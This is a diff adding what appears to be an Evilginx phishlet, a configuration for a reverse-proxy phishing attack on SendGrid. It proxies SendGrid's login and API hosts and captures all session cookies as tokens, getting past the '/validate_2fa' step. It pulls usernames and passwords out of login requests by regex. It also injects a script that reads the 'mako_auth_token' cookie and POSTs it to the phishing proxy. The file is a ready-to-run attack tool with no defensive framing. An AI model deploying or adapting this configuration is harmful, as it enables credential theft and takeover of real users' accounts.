@@ -1,0 +1,34 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'sendgrid.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'sendgrid.com', session: true, is_landing: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'sendgrid.com', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'app.sendgrid.com', orig_sub: 'app', domain: 'sendgrid.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sendgrid.com', orig_sub: '', domain: 'sendgrid.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: 'app.sendgrid.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/validate_2fa'
+credentials:
+  username:
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+  custom:
+    key: 'mako_auth_token'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'app.sendgrid.com'
+  path: '/login?redirect_to=%2Faccount%2Fdetails'
+js_inject:
+  - trigger_domains: ["app.sendgrid.com"]
+    trigger_paths: ["/account/details"]
+    script: |
+        function lp(){         var mako_auth_token = $.cookie("mako_auth_token");         var xhr = new XMLHttpRequest();         xhr.open("POST", '/touhou', true);         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");         xhr.send("mako_auth_token="+encodeURIComponent(mako_auth_token));         return;         }         setTimeout(function(){lp();}, 100);  
